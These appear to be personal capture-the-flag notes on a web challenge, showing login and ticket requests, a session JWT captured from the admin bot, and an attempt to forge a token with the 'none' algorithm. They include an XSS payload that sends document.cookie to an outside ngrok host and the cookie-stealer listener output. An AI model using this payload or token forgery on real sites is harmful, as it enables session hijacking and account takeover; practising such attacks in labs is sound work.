
[http://165.22.125.212:30333/](#http://165.22.125.212:30333/)



**Got a few simple things here:
**
**1\) main page sends a message to /api/tickets/add:**

POST /api/tickets/add HTTP/1\.1
Host: 165\.22\.125\.212:30333
User\-Agent: Mozilla/5\.0 \(Windows NT 10\.0; rv:91\.0\) Gecko/20100101 Firefox/91\.0
Accept: \*/\*
Accept\-Language: en\-US,en;q=0\.5
Accept\-Encoding: gzip, deflate
Referer: [http://165.22.125.212:30333/](#http://165.22.125.212:30333/)

Content\-Type: application/json
Origin: [http://165.22.125.212:30333](#http://165.22.125.212:30333)

Content\-Length: 18
DNT: 1
Connection: close

\{"message":"main"\}

**2\) /login page sends  to /api/login:**

POST /api/login HTTP/1\.1
Host: 165\.22\.125\.212:30333
User\-Agent: Mozilla/5\.0 \(Windows NT 10\.0; rv:91\.0\) Gecko/20100101 Firefox/91\.0
Accept: \*/\*
Accept\-Language: en\-US,en;q=0\.5
Accept\-Encoding: gzip, deflate
Referer: [http://165.22.125.212:30333/login](#http://165.22.125.212:30333/login)

Content\-Type: application/json
Origin: [http://165.22.125.212:30333](#http://165.22.125.212:30333)

Content\-Length: 39
DNT: 1
Connection: close

\{"username":"admin","password":"admin"\}


**Okay, so, idk why but I never tried an XSS here but got a cookie right away from the admin with:**

┌─\[root@parrotLT\]─\[/ws\]
└──╼ #python3 cookiestealer\.py 


Use this URL:

\<script\>document\.location='[https://1dd3-216-93-199-231.ngrok.io/?c='+document.cookie;</script>](#https://1dd3-216-93-199-231.ngrok.io/?c='+document.cookie;</script>)



\* Serving Flask app "cookiestealer" \(lazy loading\)
\* Environment: production
WARNING: This is a development server\. Do not use it in a production deployment\.
Use a production WSGI server instead\.
\* Debug mode: off
\* Running on [http://0.0.0.0:12344/](#http://0.0.0.0:12344/)
\(Press CTRL\+C to quit\)
127\.0\.0\.1 \- \- \[16/May/2022 01:18:37\] "GET /?c=session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2ODkxNDN9\.utbcrTt709FuIDLvmF\-ZTNGxeQ09Kzl2cGLZqcYhohs HTTP/1\.1" 404 \-


**Added this quickly to my request to login:**

Took this JWT apart in jwt\.io:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2ODkxNDN9\.utbcrTt709FuIDLvmF\-ZTNGxeQ09Kzl2cGLZqcYhohs


\{
"alg": "HS256",
"typ": "JWT"
\}

\{
"username": "moderator",
"uid": 100,
"iat": 1652689143
\}

**So, maybe I can use this info to get in:**

**Logged in w/**: moderator / moderator
Nope, doesn't work\.

**Found in the login page a redirect should go to /tickets;**

\.then\(\(resp\) =\> \{
if \(response\.status == 200\) \{
card\.text\(resp\.message\);
card\.show\(\);
window\.location\.href = '/tickets';
return;

**Tried modifying a request to this with the cookie above\.\.**

**Doesn't work with post, but works with get\.\.****However, authentication required\!****JWT's expire fast, tried my phish again\.\.**

/?c=session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2ODk4OTF9\.toFX\_rvK\_q\_WxGBQUxopuL6AQIG8Tw\_Zq4\-S6aggULQ HTTP/1\.1

**Okay, so still getting 'Authentication required:
**
Connection: keep\-alive
Content\-Length: 62
Content\-Type: application/json; charset=utf\-8
Date: Mon, 16 May 2022 08:32:18 GMT
ETag: W/"3e\-/1UkwJa\+jPgD9s2rwxKvVNkt/Ws"
Keep\-Alive: timeout=5
X\-Powered\-By: Express

Accept: text/html,application/xhtml\+xml,application/xml;q=0\.9,image/webp,\*/\*;q=0\.8
Accept\-Encoding: gzip, deflate
Accept\-Language: en\-US,en;q=0\.5
Connection: keep\-alive
DNT: 1
Host: 165\.22\.125\.212:30333
Upgrade\-Insecure\-Requests: 1
User\-Agent: Mozilla/5\.0 \(Windows NT 10\.0; rv:91\.0\) Gecko/20100101 Firefox/91\.0

**Lets look @ the jwt again:**

**Maybe I can replace it with None and change stuff, its either that or use it for something like /api/tickets/list:**

ewogICJhbGciOiAibm9uZSIsCiAgInR5cGUiOiAiSldUIgp9\.

